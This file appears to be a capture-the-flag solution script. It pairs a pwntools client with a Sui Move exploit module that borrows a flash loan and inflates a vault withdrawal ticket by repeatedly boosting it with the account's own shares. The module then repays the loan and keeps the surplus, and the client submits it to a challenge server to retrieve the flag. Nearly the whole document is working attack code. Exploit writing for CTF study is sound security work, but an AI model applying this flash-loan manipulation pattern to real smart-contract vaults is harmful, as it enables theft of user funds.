from pwn import context, remote

EXPLOIT_CODE = r"""module solution::exploit {
    use challenge::vault::{Self, Vault};
    use sui::clock::Clock;
    use sui::tx_context::{Self, TxContext};
    use sui::coin;
    public fun solve(vault: &mut Vault, clock: &Clock, ctx: &mut TxContext) {
        let loan_amt: u64 = 100_000_000;
        let (coins, receipt) = vault::flash_loan(vault, loan_amt, ctx);
        let mut account = vault::create_account(ctx);
        vault::deposit(vault, &mut account, coins, ctx);
        let mut ticket = vault::create_ticket(vault, &mut account, 1, clock, ctx);
        let boost = vault::user_shares(&account);
        let mut i: u64 = 0;
        while (i < 100) {
            ticket = vault::boost_ticket(vault, &mut account, ticket, boost, ctx);
            i = i + 1;
        };
        let mut payout = vault::finalize_withdraw(vault, &mut account, ticket, clock, ctx);
        let fee = (loan_amt * 9) / 10000 + 1;
        let repay = coin::split(&mut payout, loan_amt + fee, ctx);
        vault::repay_loan(vault, repay, receipt);
        sui::transfer::public_transfer(payout, tx_context::sender(ctx));
        vault::destroy_account(account);
    }
}
"""

def solution(host: str, port: str) -> str:
    context.update({"log_level":"error"})
    with remote(host, port) as rem:
        rem.sendlineafter(b"[INPUT] Module size (bytes): ", str(len(EXPLOIT_CODE.encode())).encode())
        rem.sendlineafter(b"[INPUT] Source Code: ", EXPLOIT_CODE.encode())
        rem.recvuntil(b"FLAG: ")
        flag = rem.recvline().strip().decode()
    return flag

if __name__ == "__main__":
    host = "chals.bitskrieg.in"
    port = "32675"
    print(solution(host, port))
    